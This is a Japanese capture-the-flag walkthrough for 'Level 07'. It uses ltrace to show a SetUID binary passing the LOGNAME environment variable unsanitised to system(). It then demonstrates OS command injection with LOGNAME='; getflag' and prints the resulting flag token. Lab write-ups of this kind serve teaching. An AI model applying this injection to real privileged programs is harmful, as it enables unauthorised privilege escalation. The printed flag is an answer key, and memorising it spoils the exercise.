# Level 07

## 目的
ユーザー `flag07` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level07` ユーザーでログイン後、ホームディレクトリにある実行ファイル `level07` を確認します。

```bash
ls -l level07
```
SetUIDされたバイナリです。`ltrace` で動作を確認します。

```bash
ltrace ./level07
```
出力（一部抜粋）:
```text
getenv("LOGNAME") = "level07"
asprintf(..., "/bin/echo %s", "level07")
system("/bin/echo level07 ")
```
このプログラムは、環境変数 `LOGNAME` の値を取得し、それを `/bin/echo` コマンドの引数として `system()` 関数で実行していることがわかります。

### 2. 脆弱性の特定

`system()` 関数内で実行されるコマンド文字列は、環境変数 `LOGNAME` をそのまま埋め込んで構築されています。
これを利用して、コマンドセパレータ（`;`）などを `LOGNAME` に含めることで、任意のコマンドを実行させることができます（OSコマンドインジェクション）。

### 3. エクスプロイト（攻撃）

環境変数 `LOGNAME` に、実行したいコマンド `getflag` を含めてプログラムを実行します。

```bash
export LOGNAME="; getflag"
./level07
```

このとき、`system()` 関数には以下の文字列が渡されます。
```bash
/bin/echo ; getflag
```
これにより、まず `echo` が（引数なしで）実行され、次に `getflag` が実行されます。

### 4. 結果

`getflag` が実行され、フラグが表示されました。

```text
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## 結果

### トークン (Flag)
`fiumuikeil55xe9cu4dood66h`
